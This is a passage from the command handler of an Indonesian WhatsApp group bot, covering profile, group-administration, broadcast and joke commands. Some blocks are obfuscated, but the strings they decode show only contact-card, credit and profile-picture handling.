        _0x3970a4 = _0x5beddb();
    while (!![]) {
        try {
            var _0x4da0e6 = parseInt(_0x80bc9d(0x1ff)) / 0x1 * (-parseInt(_0x80bc9d(0x201)) / 0x2) + -parseInt(_0x80bc9d(0x1e9)) / 0x3 * (parseInt(_0x80bc9d(0x1fa)) / 0x4) + -parseInt(_0x80bc9d(0x1ee)) / 0x5 * (parseInt(_0x80bc9d(0x1fd)) / 0x6) + -parseInt(_0x80bc9d(0x1f7)) / 0x7 * (parseInt(_0x80bc9d(0x1ea)) / 0x8) + parseInt(_0x80bc9d(0x1f4)) / 0x9 + parseInt(_0x80bc9d(0x1fc)) / 0xa + parseInt(_0x80bc9d(0x1f3)) / 0xb;
            if (_0x4da0e6 === _0x17a0e1) break;
            else _0x3970a4['push'](_0x3970a4['shift']());
        } catch (_0x322f7a) {
            _0x3970a4['push'](_0x3970a4['shift']());
        }
    }
}(_0x1d19, 0x64cf8));
if (!isCreator) return newReply(mess[_0x2d2a75(0x1f2)]);

function _0x31ee(_0x4a5085, _0x23d021) {
    var _0x1d199d = _0x1d19();
    return _0x31ee = function (_0x31ee4c, _0xf0e768) {
            _0x31ee4c = _0x31ee4c - 0x1e8;
            var _0x46be36 = _0x1d199d[_0x31ee4c];
            return_0x46be36;
}, _0x31ee(_0x4a5085, _0x23d021);
}
if (!quoted) return newReply(_0x2d2a75(0x1ef) + (prefix + command));
if (!/image/ [_0x2d2a75(0x1ed)](mime)) return newReply(_0x2d2a75(0x1ef) + (prefix + command));
if (/webp/ [_0x2d2a75(0x1ed)](mime)) return newReply(_0x2d2a75(0x1ef) + (prefix + command));
var medis = await conn[_0x2d2a75(0x1ec)](quoted, _0x2d2a75(0x1fb));
if (args[0x0] == _0x2d2a75(0x1f9)) {
    var {
        img
    } = await generateProfilePicture(medis);
    await conn[_0x2d2a75(0x1e8)]({
        'tag': 'iq',
        'attrs': {
            'to': botNumber,
            'type': _0x2d2a75(0x1f0),
            'xmlns': _0x2d2a75(0x200)
        },
        'content': [{
            'tag': _0x2d2a75(0x1f5),
            'attrs': {
                'type': _0x2d2a75(0x1f6)
            },
            'content': img
        }]
    }), fs[_0x2d2a75(0x1f1)](medis), newReply(mess[_0x2d2a75(0x1eb)]);
} else {
    var memeg = await conn[_0x2d2a75(0x1f8)](botNumber, {
        'url': medis
    });
    fs[_0x2d2a75(0x1f1)](medis), newReply(_0x2d2a75(0x1fe));
}
            }
        break
        
        case 'autoread':
            if (!isCreator) return newReply(mess.owner)
            if (args.length < 1) return newReply(`Contoh ${prefix + command} on/off`)
            if (q === 'on'){
            global.db.data.settings[botNumber].autoread = true
            newReply(`Berhasil mengubah autoread ke ${q}`)
            } else if (q === 'off'){
            global.db.data.settings[botNumber].autoread = false
            newReply(`Berhasil mengubah autoread ke ${q}`)
            }
        break
        
        // Main Menu
        case 'speedtest': {
                newReply('Testing Speed...')
                let cp = require('child_process')
                let {
                    promisify
                } = require('util')
                let exec = promisify(cp.exec).bind(cp)
                let o
                try {
                    o = await exec('python speed.py')
                } catch (e) {
                    o = e
                } finally {
                    let {
                        stdout,
                        stderr
                    } = o
                    if (stdout.trim()) newReply(stdout)
                    if (stderr.trim()) newReply(stderr)
                }
            }
        break
        case 'owner': 
        case 'creator':
                function _0x5ca7(){const _0x12f744=['TEL;type=MSG;type=CELL;type=VOICE;waid=','1455258XGRDbN','ORG:','BEGIN:VCARD\x0a','8glCARe','4Uzqwsv','2737098EYqbAV','6788187wCCBhV','26366AaJhZb','13XSwwdP','7943664guqOVl','7bWwjty','FN:','939415cowkZB','1175933EAkLmn','70nWsFEM'];_0x5ca7 = function () {
    return _0x12f744;
};
return _0x5ca7();
}
const _0x2f4a42 = _0x4670;

function _0x4670(_0x177716, _0x1e9cb2) {
    const _0x5ca7a2 = _0x5ca7();
    return _0x4670 = function (_0x46702d, _0xb3ce2f) {
        _0x46702d = _0x46702d - 0x103;
        let _0x21449b = _0x5ca7a2[_0x46702d];
        return _0x21449b;
    }, _0x4670(_0x177716, _0x1e9cb2);
}(function (_0x515640, _0x465970) {
    const _0x171589 = _0x4670,
        _0x11cc00 = _0x515640();
    while (!![]) {
        try {
            const _0x4dfac7 = -parseInt(_0x171589(0x105)) / 0x1 * (-parseInt(_0x171589(0x104)) / 0x2) + -parseInt(_0x171589(0x112)) / 0x3 * (-parseInt(_0x171589(0x111)) / 0x4) + -parseInt(_0x171589(0x109)) / 0x5 + -parseInt(_0x171589(0x10d)) / 0x6 * (-parseInt(_0x171589(0x107)) / 0x7) + -parseInt(_0x171589(0x110)) / 0x8 * (-parseInt(_0x171589(0x103)) / 0x9) + parseInt(_0x171589(0x10b)) / 0xa * (-parseInt(_0x171589(0x10a)) / 0xb) + -parseInt(_0x171589(0x106)) / 0xc;
            if (_0x4dfac7 === _0x465970) break;
            else _0x11cc00['push'](_0x11cc00['shift']());
        } catch (_0x2c2891) {
            _0x11cc00['push'](_0x11cc00['shift']());
        }
    }
}(_0x5ca7, 0x75c33));
const vcard = _0x2f4a42(0x10f) + (_0x2f4a42(0x108) + namaowner + '\x0a') + (_0x2f4a42(0x10e) + namabot + ';\x0a') + (_0x2f4a42(0x10c) + owner + ':+' + nomerowner + '\x0a') + 'END:VCARD';
conn['sendMessage'](m['chat'], {
    'contacts': {
        'displayName': namaowner,
        'contacts': [{
            'vcard': vcard
        }]
    }
}, {
    'quoted': fkontak
});
        break
        case 'ceklimit': 
        case 'checklimit': 
        case 'limit':{
					newReply('Your Limit: ' + (db.data.users[m.sender].limit))
					}
	    break
        case 'runtime':
            	newReply(`The bot has been active for a long time\n*${runtime(process.uptime())}*`)
        break
        
        case 'totalfitur':
        case 'fitur': 
            newReply(`Total Bot Features Are ${totalFitur()}`)
        break
        
        case 'ping': {
            const used = process.memoryUsage()
            let timestamp = speed()
            let latensi = speed() - timestamp
            let neww = performance.now()
            let oldd = performance.now()
            let respon = `Kecepatan Respon ${latensi.toFixed(4)} _Second_ 

_Info Server_
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
`.trim()
conn.relayMessage(m.chat, { liveLocationMessage: { 
degreesLatitude: 35.676570,
degreesLongitude: 139.762148,
caption: respon,
sequenceNumber: 1656662972682001, timeOffset: 8600, jpegThumbnail: fs.readFileSync('./media/thumb.jpg'),
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
}
}
}} , { quoted: m })
        }
        break
        
case 'tqto': {
  const _0x33621f=_0x1042;function _0x2df4(){const _0x5a2cbb=['9887751DMfcFq','14trRqlb','chat','1007808yzMqsX','sendMessage','4479LkulFh','124Qddnzx','https://telegra.ph/file/6d78dbc8e389cf01b79cf.jpg','6082056SrUOXY','1111422grLGUZ','5001668YdbekH','\x0a\x20\x20_*TERIMA\x20KASIH\x20KEPADA*_\x0a\x0a\x20\x20*•\x20ALLAH\x20SWT*\x0a\x20\x20*•\x20NABI\x20MUHAMMAD\x20SAW*\x0a\x20\x20*•\x20MY\x20PARENTS*\x0a\x20\x20*•\x20AdrianTzy\x20(\x20Author\x20)*\x0a\x20\x20*•\x20LoL-Human\x20(\x20Rest\x20APIs\x20)*\x0a\x20\x20*•\x20','*\x0a\x20\x20*•\x20XTRAM*\x0a\x20\x20*•\x20DanuDev*\x0a\x20\x20*•\x20Reii\x20Code*\x0a\x20\x20*•\x20WH\x20MODS*\x0a\x20\x20*•\x20YogzzDevX*\x0a\x20\x20*•\x20KilersBotz*\x0a\x20\x20*•\x20LuckyCat*\x0a\x20\x20*•\x20Rullxzz*\x0a\x20\x20*•\x20Para\x20Subscribe*\x0a\x20\x20*•\x20Para\x20Penyediaan\x20Module*\x0a\x20\x20*•\x20Para\x20Donatur*\x0a\x20\x20','119975oWZBwW'];_0x2df4=function(){return _0x5a2cbb;};return _0x2df4();}(function(_0x57ce85,_0x28507a){const _0x5ec007=_0x1042,_0x5379f7=_0x57ce85();while(!![]){try{const _0x1b1057=parseInt(_0x5ec007(0x10e))/0x1+-parseInt(_0x5ec007(0x114))/0x2*(-parseInt(_0x5ec007(0x118))/0x3)+-parseInt(_0x5ec007(0x119))/0x4*(-parseInt(_0x5ec007(0x112))/0x5)+-parseInt(_0x5ec007(0x116))/0x6+-parseInt(_0x5ec007(0x10f))/0x7+parseInt(_0x5ec007(0x10d))/0x8+-parseInt(_0x5ec007(0x113))/0x9;if(_0x1b1057===_0x28507a)break;else _0x5379f7['push'](_0x5379f7['shift']());}catch(_0x3c9f30){_0x5379f7['push'](_0x5379f7['shift']());}}}(_0x2df4,0x9d6ec));function _0x1042(_0x45427a,_0x811ceb){const _0x2df454=_0x2df4();return _0x1042=function(_0x10424c,_0x107eb7){_0x10424c=_0x10424c-0x10d;let _0x11727a=_0x2df454[_0x10424c];return _0x11727a;},_0x1042(_0x45427a,_0x811ceb);}let tqtonya=_0x33621f(0x110)+namaowner+_0x33621f(0x111);conn[_0x33621f(0x117)](m[_0x33621f(0x115)],{'text':tqtonya,'contextInfo':{'externalAdReply':{'showAdAttribution':!![],'title':''+ucapanWaktu,'body':''+pushname,'thumbnailUrl':_0x33621f(0x11a),'sourceUrl':''+isLink,'mediaType':0x1,'renderLargerThumbnail':!![]}}});
}
break
            case 'sc':
            case 'script':
               function _0x48d7(_0x14f072, _0x29b7a7) {
    var _0x35fbff = _0x35fb();
    return _0x48d7 = function (_0x48d75d, _0x45833f) {
        _0x48d75d = _0x48d75d - 0xb1;
        var _0x394e32 = _0x35fbff[_0x48d75d];
        return _0x394e32;
    }, _0x48d7(_0x14f072, _0x29b7a7);
}
var _0x218d73 = _0x48d7;

function _0x35fb() {
    var _0x4f1e3b = ['https://youtube.com/playlist?list=PLRmLRCoejWJsauHXGmkKERWnptlwtOy2q', '4879890khOmth', '2070kRGErB', '28295pqllNW', '531tjwrrz', '1079yZujew', '906Wuppor', '2256950dFlorC', '44XNZJgv', '9420776hAoMmA', '2743524iQbgfX', '28568rvnzvB'];
    _0x35fb = function () {
        return _0x4f1e3b;
    };
    return _0x35fb();
}(function (_0x474960, _0x2941da) {
    var _0x24539d = _0x48d7,
        _0x5dec2c = _0x474960();
    while (!![]) {
        try {
            var _0xc05373 = parseInt(_0x24539d(0xbb)) / 0x1 * (parseInt(_0x24539d(0xb8)) / 0x2) + parseInt(_0x24539d(0xba)) / 0x3 * (parseInt(_0x24539d(0xb5)) / 0x4) + parseInt(_0x24539d(0xb9)) / 0x5 * (-parseInt(_0x24539d(0xbc)) / 0x6) + -parseInt(_0x24539d(0xb4)) / 0x7 + parseInt(_0x24539d(0xb3)) / 0x8 + -parseInt(_0x24539d(0xb7)) / 0x9 + parseInt(_0x24539d(0xb1)) / 0xa * (-parseInt(_0x24539d(0xb2)) / 0xb);
            if (_0xc05373 === _0x2941da) break;
            else _0x5dec2c['push'](_0x5dec2c['shift']());
        } catch (_0x54e3a8) {
            _0x5dec2c['push'](_0x5dec2c['shift']());
        }
    }
}(_0x35fb, 0xd3af9), newReply(_0x218d73(0xb6)));
            break
        // Group Fitur
            case 'kick': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'add': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'promote': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'demote': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'block': {
                if (!isCreator) return newReply(mess.owner)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.updateBlockStatus(users, 'block').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'unblock': {
                if (!isCreator) return newReply(mess.owner)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.updateBlockStatus(users, 'unblock').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'setname':
            case 'setsubject': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (!text) return 'Text ?'
                await conn.groupUpdateSubject(m.chat, text).then((res) => newReply(mess.success)).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'setdesc':
            case 'setdesk': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (!text) return 'Text ?'
                await conn.groupUpdateDescription(m.chat, text).then((res) => newReply(mess.success)).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc': {
                var _0x50f3e3=_0xe209;(function(_0x3539fb,_0x221968){var _0x415b38=_0xe209,_0x1a0146=_0x3539fb();while(!![]){try{var _0x33922b=parseInt(_0x415b38(0x145))/0x1+parseInt(_0x415b38(0x147))/0x2+parseInt(_0x415b38(0x139))/0x3+parseInt(_0x415b38(0x141))/0x4*(-parseInt(_0x415b38(0x149))/0x5)+parseInt(_0x415b38(0x142))/0x6+-parseInt(_0x415b38(0x138))/0x7*(-parseInt(_0x415b38(0x148))/0x8)+-parseInt(_0x415b38(0x13d))/0x9;if(_0x33922b===_0x221968)break;else _0x1a0146['push'](_0x1a0146['shift']());}catch(_0x4c32cd){_0x1a0146['push'](_0x1a0146['shift']());}}}(_0x2f45,0x93c7b));if(!m[_0x50f3e3(0x14b)])return reply(mess[_0x50f3e3(0x140)]);if(!isAdmins)return reply(mess[_0x50f3e3(0x137)]);if(!isBotAdmins)return reply(mess[_0x50f3e3(0x13e)]);if(!quoted)return reply(_0x50f3e3(0x136)+(prefix+command));function _0xe209(_0x5361ca,_0x167954){var _0x2f45c1=_0x2f45();return _0xe209=function(_0xe2090e,_0x24b7f4){_0xe2090e=_0xe2090e-0x134;var _0x413c4e=_0x2f45c1[_0xe2090e];return _0x413c4e;},_0xe209(_0x5361ca,_0x167954);}if(!/image/['test'](mime))return reply(_0x50f3e3(0x136)+(prefix+command));if(/webp/[_0x50f3e3(0x144)](mime))return reply(_0x50f3e3(0x136)+(prefix+command));function _0x2f45(){var _0x252d0e=['ppgc.jpeg','group','345784EEjJTC','1033890GLprrW','set','test','341680uqcEBF','w:profile:picture','485944EDvvyC','1423832edNMDP','35kvgXDy','image','isGroup','Sukses','chat','/panjang','Kirim/Reply\x20Image\x20Dengan\x20Caption\x20','admin','28vPLIjh','1974081GvpIHd','query','downloadAndSaveMediaMessage','unlinkSync','8248329EDjAsi','botAdmin'];_0x2f45=function(){return _0x252d0e;};return _0x2f45();}var mediz=await conn[_0x50f3e3(0x13b)](quoted,_0x50f3e3(0x13f));if(args[0x0]==_0x50f3e3(0x135)){var {img}=await generateProfilePicture(mediz);await conn[_0x50f3e3(0x13a)]({'tag':'iq','attrs':{'to':m[_0x50f3e3(0x134)],'type':_0x50f3e3(0x143),'xmlns':_0x50f3e3(0x146)},'content':[{'tag':'picture','attrs':{'type':_0x50f3e3(0x14a)},'content':img}]}),fs[_0x50f3e3(0x13c)](mediz),reply('Sukses');}else{var memeg=await conn['updateProfilePicture'](m[_0x50f3e3(0x134)],{'url':mediz});fs['unlinkSync'](mediz),reply(_0x50f3e3(0x14c));}
            }
            break
            case 'tagall': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let teks = `*👥 Tag All By Admin*
 
                 🗞️ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                conn.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            }
            break
            case 'hidetag': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                conn.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            }
            break
            case 'totag': {
               if (!m.isGroup) return newReply(mess.group)
               if (!isBotAdmins) return mess.botAdmin
               if (!isAdmins) return mess.admin
               if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
               conn.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
            case 'antilink': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilink) return newReply(`Sudah Aktif Sebelumnya 🕊️`)
                    db.data.chats[m.chat].antilink = true
                    newReply(`Antilink Group WhatsApp Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilink) return newReply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilink = false
                    newReply(`Antilink Group WhatsApp Nonaktif 🕊️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
                }
            }
            break
            case 'antilinkyt': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilinkyt) return newReply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilinkyt = true
                    newReply(`Antilink YouTube Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilinkyt) return newReply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilinkyt = false
                    newReply(`Antilink YouTube Nonaktif 🕊️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
                }
            }
            break
            case 'antilinktt': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilinktt) return newReply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilinktt = true
                    newReply(`Antilink TikTok Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilinktt) return newReply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilinktt = false
                    newReply(`Antilink TikTok Nonaktif 🕊️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
                }
            }
            break
            case 'antipushkontakv1': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antipushkontakv1) return newReply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antipushkontakv1 = true
                    newReply(`Anti Push Kontak Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antipushkontakv1) return newReply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antipushkontakv1 = false
                    newReply(`Anti Push kontak Nonaktif 🕊️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
                }
            }
            break
            case 'antipushkontakv2': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antipushkontakv2) return newReply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antipushkontakv2 = true
                    newReply(`Anti Push Kontak Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antipushkontakv2) return newReply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antipushkontakv2 = false
                    newReply(`Anti Push kontak Nonaktif 🕊️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
                }
            }
            break
            case 'mutegc': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].mute) return newReply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].mute = true
                    newReply(`${ntiktok} telah di mute di group ini 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].mute) return newReply(`Sudah Tidak Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].mute = false
                    newReply(`${ntiktok} telah di unmute di group ini 🕊️`)
                } else {
                   newReply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
                }
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === '1') {
                    await conn.groupToggleEphemeral(m.chat, 1*24*3600).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === '7') {
                    await conn.groupToggleEphemeral(m.chat, 7*24*3600).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === '90') {
                    await conn.groupToggleEphemeral(m.chat, 90*24*3600).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'off') {
                    await conn.groupToggleEphemeral(m.chat, 0).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else {
                let sections = [
                {
                title: "CHANGE EFFECTIVE GROUP",
                rows: [
                {title: "⌲ Ephemeral 1 day", rowId: `ephemeral 1`, description: `Activate the ephemeral group for 1 day`},
                {title: "⌲ Ephemeral 7 day's", rowId: `ephemeral 7`, description: `Activate the ephemeral group for 7 day's`},
                {title: "⌲ Ephemeral 90 days's", rowId: `ephemeral 90`, description: `Activate the ephemeral group for 90 day's`},
                {title: "⌲ Ephemeral Off", rowId: `ephemeral off`, description: `Deactivate this Ephemeral group`}
                ]
                },
                ]
                conn.sendListMsg(m.chat, `Please select the following Ephemeral Options List !`, ntiktok, `Hello Admin ${groupMetadata.subject}`, `Touch Me (⁠≧⁠▽⁠≦⁠)`, sections, m)
                }
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) return newReply(mess.owner)
                if (!text) return `Text mana?\n\nContoh : ${prefix + command} Akame ><`
                let getGroups = await conn.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                newReply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                    newReply(txt)
                }
                newReply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) return newReply(mess.owner)
                if (!text) return `Text mana?\n\nContoh : ${prefix + command} Akame ><`
                let anu = await store.chats.all().map(v => v.id)
                newReply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		    for (let yoi of anu) {
		            await sleep(1500)
		            let txt = `「 Broadcast Bot 」\n\n${text}`
                    newReply(txt)
                }
		    newReply('Sukses Broadcast')
            }
            break
            case 'group':
            case 'grup': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                if (args[0] === 'close') {
                    await conn.groupSettingUpdate(m.chat, 'announcement').then((res) => newReply(`Sukses Menutup Group 🕊️`)).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'open') {
                    await conn.groupSettingUpdate(m.chat, 'not_announcement').then((res) => newReply(`Sukses Membuka Group 🕊️`)).catch((err) => newReply(jsonformat(err)))
                } else {
                  newReply(`Mode ${command}\n\n\nKetik ${prefix + command}open/close`)
                }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === 'open') {
                    await conn.groupSettingUpdate(m.chat, 'unlocked').then((res) => newReply(`Sukses Membuka Edit Info Group 🕊️`)).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'close') {
                    await conn.groupSettingUpdate(m.chat, 'locked').then((res) => newReply(`Sukses Menutup Edit Info Group 🕊️`)).catch((err) => newReply(jsonformat(err)))
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
                }
            }
            break
            case 'linkgroup':
            case 'linkgrup':
            case 'linkgc': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let response = await conn.groupInviteCode(m.chat)
                conn.sendText(m.chat, `👥 *INFO LINK GROUP*\n📛 *Nama :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Tidak diketahui'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Link Chat :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m,  {
                    detectLink: true
                })
            }
            break
            case 'revoke': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                await conn.groupRevokeInvite(m.chat)
                    .then(res => {
                        newReply(`Sukses Menyetel Ulang, Tautan Undangan Grup ${groupMetadata.subject}`)
                    }).catch((err) => newReply(jsonformat(err)))
                    }
            break
            case 'listonline':
            case 'liston': {
                if (!m.isGroup) newReply(mess.group)
                let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                let online = [...Object.keys(store.presences[id]), botNumber]
                conn.sendText(m.chat, '⏰ List Online:\n\n' + online.map(v => '🌱 @' + v.replace(/@.+/, '')).join`\n`, m, {
                    mentions: online
                })
            }
            break
        // Fun Fitur 
        
            case 'apakah': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
                const kah = apa[Math.floor(Math.random() * apa.length)]
                newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
                }
                break
            case 'bisakah': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
                const ga = bisa[Math.floor(Math.random() * bisa.length)]
                newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
                }
                break
            case 'bagaimanakah': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Yang Sabar Ya Bos:(', 'Gimana yeee']
                const ya = gimana[Math.floor(Math.random() * gimana.length)]
                newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
                }
            break
            case 'rate': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
                const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const te = ra[Math.floor(Math.random() * ra.length)]
                newReply(`Rate : ${q}\nJawaban : *${te}%*`)
                }
            break
            
            case 'gantengcek':
            case 'cekganteng': {
